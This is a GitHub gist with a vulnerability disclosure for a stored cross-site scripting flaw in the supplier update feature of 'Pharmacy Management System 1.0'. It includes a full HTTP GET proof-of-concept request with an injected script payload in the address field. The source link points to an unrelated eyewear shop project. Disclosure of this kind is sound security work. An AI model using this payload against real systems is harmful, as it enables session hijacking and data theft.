
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@higordiego](https://avatars.githubusercontent.com/u/10968610?s=64&v=4)](/higordiego)

# [higordiego](/higordiego)/**[xss\_persistencemanager\_edit\_supplier.md](/higordiego/bc051be4a8c6b6641578cad533742aab)** Secret

Created
October 19, 2024 16:05

Show Gist options

* [Download ZIP](/higordiego/bc051be4a8c6b6641578cad533742aab/archive/8f1ceb8eb4f3981ed2ca2cd560d2c78d24358719.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/bc051be4a8c6b6641578cad533742aab.js&quot;&gt;&lt;/script&gt;
* Save higordiego/bc051be4a8c6b6641578cad533742aab to your computer and use it in GitHub Desktop.

[Code](/higordiego/bc051be4a8c6b6641578cad533742aab)
[Revisions
2](/higordiego/bc051be4a8c6b6641578cad533742aab/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/bc051be4a8c6b6641578cad533742aab.js&quot;&gt;&lt;/script&gt;

Save higordiego/bc051be4a8c6b6641578cad533742aab to your computer and use it in GitHub Desktop.

[Download ZIP](/higordiego/bc051be4a8c6b6641578cad533742aab/archive/8f1ceb8eb4f3981ed2ca2cd560d2c78d24358719.zip)

 [Raw](/higordiego/bc051be4a8c6b6641578cad533742aab/raw/8f1ceb8eb4f3981ed2ca2cd560d2c78d24358719/xss_persistencemanager_edit_supplier.md)

[**xss\_persistencemanager\_edit\_supplier.md**](#file-xss_persistencemanager_edit_supplier-md)

## **Affected Version:**

* **Pharmacy Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** Stored Cross-Site Scripting (XSS)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* `/php/manage_supplier.php?action=update&id=35&name=A&email=contato@gmail.com&contact_number=0987654321&address=a`

## **Vulnerability Description:**

A **stored XSS vulnerability** has been identified in the **Pharmacy Management System** version 1.0, specifically in the **supplier management update functionality**. This vulnerability occurs because the input in the `address` parameter is not properly sanitized before being saved to the database. This flaw allows attackers to inject malicious JavaScript code that will persist in the system and execute whenever the affected supplier record is accessed.

Since this vulnerability affects both administrators and users, it poses a **high risk** by enabling:

* **Session hijacking**
* **Theft of sensitive data** (e.g., authentication tokens)
* **Privilege escalation**
* **Website defacement** and manipulation of critical records
* **Phishing attacks** to trick users or administrators into disclosing personal information

The persistent nature of the vulnerability makes it particularly dangerous, as the malicious code is executed every time the affected page is loaded.

---

## **Proof of Concept (PoC):**

Below is an example of a **GET** request that demonstrates the vulnerability by injecting a simple JavaScript payload into the `address` field:

```
GET /php/manage_supplier.php?action=update&id=35&name=A&email=contato@gmail.com&contact_number=0987654321&address=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E HTTP/1.1
Host: localhost:8080
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/manage_supplier.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```

When this payload is submitted, the malicious JavaScript code will be stored in the supplier’s address field. Every time the supplier record is viewed, the following JavaScript will execute, triggering an alert:

```
<script>alert('XSS');</script>
```

This demonstrates how the vulnerability works. A more advanced attacker could use this to steal session cookies or redirect users to malicious websites.

---

## **Burp Suite Requests:**

* [![Burp Suite PoC](https://camo.githubusercontent.com/51b6386f46a2c4c8452f00dd65a790a5e7024aef59025ecbfd26f0eaabf9c475/68747470733a2f2f692e6962622e636f2f6d4454683933542f323032342d31302d31392d31322d34382d7873732d737570706c6965722d656469742d332e706e67)](https://camo.githubusercontent.com/51b6386f46a2c4c8452f00dd65a790a5e7024aef59025ecbfd26f0eaabf9c475/68747470733a2f2f692e6962622e636f2f6d4454683933542f323032342d31302d31392d31322d34382d7873732d737570706c6965722d656469742d332e706e67)

---

## **Browser Response:**

* [![Browser PoC One](https://camo.githubusercontent.com/c0793ab42430f6d9d814759e4d9d04c461fb52ecbaa146e9bf661908e685091d/68747470733a2f2f692e6962622e636f2f33596e705a774b2f323032342d31302d31392d31322d34312d7873732d737570706c6965722d656469742d312e706e67)](https://camo.githubusercontent.com/c0793ab42430f6d9d814759e4d9d04c461fb52ecbaa146e9bf661908e685091d/68747470733a2f2f692e6962622e636f2f33596e705a774b2f323032342d31302d31392d31322d34312d7873732d737570706c6965722d656469742d312e706e67)
* [![Browser PoC Two](https://camo.githubusercontent.com/8c4b22a900304e3521cc53899165db68312dd82f892bb7c93a52a33abd51472c/68747470733a2f2f692e6962622e636f2f7343344a3442722f323032342d31302d31392d31322d34322d7873732d737570706c6965722d656469742d322e706e67)](https://camo.githubusercontent.com/8c4b22a900304e3521cc53899165db68312dd82f892bb7c93a52a33abd51472c/68747470733a2f2f692e6962622e636f2f7343344a3442722f323032342d31302d31392d31322d34322d7873732d737570706c6965722d656469742d322e706e67)

---

## **External Links:**

* [BurpSuite Request Image](https://ibb.co/4jXZ8yh)
* [Vulnerability Source](https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2Fbc051be4a8c6b6641578cad533742aab)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

